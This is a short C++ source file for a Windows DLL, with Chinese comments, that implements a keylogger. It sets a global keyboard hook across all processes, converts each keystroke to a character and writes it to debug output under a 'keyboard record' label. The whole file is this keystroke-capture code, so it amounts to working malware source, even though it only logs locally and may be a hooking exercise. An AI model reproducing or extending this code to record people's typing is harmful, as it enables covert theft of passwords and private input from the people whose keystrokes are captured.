#include "stdafx.h"
#include "MessageHook.h"
#include "wchar.h"
#include "stdlib.h"
#include <windows.h>
extern HMODULE g_Module;
HHOOK g_Hook = 0;

//钩子回调函数
LRESULT CALLBACK KeyboardProc(
	_In_  int code,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
)
{
	// 判断是否wParam与lParam都有键盘消息，是的话则执行打印操作
	if (code == HC_ACTION) {
		// 将256个虚拟键的状态拷贝到指定的缓冲区中，如果成功则继续
		BYTE KeyState[256] = { 0 };



		//虚拟键盘码存储
		if (GetKeyboardState(KeyState)) {
			// 得到第16–23位，键盘虚拟码
			LONG  KeyInfo = lParam;
			UINT  keyCode = (KeyInfo >> 16) & 0x00ff;
			WCHAR wKeyCode = 0;
			ToAscii((UINT)wParam, keyCode, KeyState, (LPWORD)&wKeyCode, 0);
			// 将其打印出来
			WCHAR szInfo[512] = { 0 };
			swprintf_s(szInfo, _countof(szInfo), L"Hook--键盘记录-->%c\n", (char)wKeyCode);
			//将内容输出到debug信息中
			OutputDebugString(szInfo);
			return 0;
		}
	}
	return CallNextHookEx(g_Hook, code, wParam, lParam);
}

bool OnHook()
{
	if (g_Hook == 0)
	{
		g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Module, 0);
		return true;
	}
	return false;
}

bool UnHook()
{
	if (g_Hook != 0)
	{
		return UnhookWindowsHookEx(g_Hook);
	}
	return false;
}